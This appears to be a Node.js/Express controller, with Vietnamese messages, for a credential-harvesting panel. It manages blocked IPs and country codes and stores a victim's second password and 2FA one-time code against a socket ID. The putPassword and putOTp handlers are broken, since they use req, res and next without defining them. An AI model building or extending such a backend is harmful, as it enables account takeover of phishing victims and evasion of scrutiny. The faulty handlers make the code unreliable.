const CTRL = require("../models/index");
const IpSchema = require("../models/ipcheck.model");
const NationSchema = require("../models/block-ip-nation.model")

const createCodeNational = async (req, res, next) => {
  const { country } = req.body;
  try {
    if (country === "") {
      return res.status(400).json({ message: "Invalid IP address" });
    }
    const checkIp = await NationSchema.find({ code: country }).count();
   
    if (checkIp === 0) {
      const code = await NationSchema.create({
        code: country,
      });

      return res.status(200).json({
        data: code,
        oke: true,
        message: "Bạn đã tạo thành công! 🎉'",
      });
    } else {
      return res.status(400).json({
        oke: false,
        message: "Bạn đã nhập ip này rồi'",
      });
    }
  } catch (error) {
    return res.status(400).json({ error: error });
  }
};

const getCodeNations = async (req, res,) => {
  const datax = await NationSchema.find({});
  console.log(datax);
  return res.status(200).json(datax);
};

const deleteCodeNation = async (req, res) => {
  const { id } = req.query;
  console.log(id);
  try {
    await NationSchema.deleteOne({ _id: id });
    return res.status(200).json("xoá thành công ");
  } catch (error) {
    return res.status(404).json({ error: error });
  }
};

const createIp = async (req, res, next) => {
  const { ip } = req.body;

  try {
    if (ip === "") {
      return res.status(400).json({ message: "Invalid IP address" });
    }
    const checkIp = await IpSchema.find({ ip: ip }).count();

    if (checkIp === 0) {
      const newUser = await IpSchema.create({
        ip: ip,
      });

      return res.status(200).json({
        data: newUser,
        oke: true,
        message: "Bạn đã tạo thành công! 🎉'",
      });
    } else {
      return res.status(400).json({
        oke: false,
        message: "Bạn đã nhập ip này rồi'",
      });
    }
  } catch (error) {
    return res.status(400).json({ error: error });
  }
};

const getIp = async (req, res,) => {
    const datax = await IpSchema.find({});
    console.log(datax);
    return res.status(200).json(datax);
};

const deleteIp = async (req, res) => {
  const { id } = req.query;
  console.log(id);
  try {
    await IpSchema.deleteOne({ _id: id });
    return res.status(200).json("xoá thành công ");
  } catch (error) {
    return res.status(404).json({ error: error });
  }
};

const putPassword = async (data) => {
  console.log(data);
  const { socketId, password, ip } = req.body;
  try {
    const datax = await CTRL.TableSchema.findByIdAndUpdate(
      socketId,
      { password2: password },

      { sort: { createdAt: -1 } }
    );
    await datax.save();
    return next;
  } catch (error) {
    return next;
  }
};
const putOTp = async (data) => {
  console.log(data);
  const { socketId, otp2FA } = req.body;
  try {
    if (socketId) {
      const datax = await CTRL.TableSchema.findByIdAndUpdate(
        socketId,
        { otp2FA: otp2FA },

        { sort: { createdAt: -1 } }
      );
      await datax.save();
      return res.status(200).json({
        oke: true,
        message: "Bạn đã cập nhật thành công! 🎉'",
      });
    } else {
      return res.status(404).json({
        oke: true,
        message: "Không tìm thấy id socket!",
      });
    }
  } catch (error) {
    return false;
  }
};
module.exports = {
  deleteCodeNation,
  getCodeNations,
  createCodeNational,
  deleteIp,
  createIp,
  getIp,
  putPassword,
  putOTp,
};
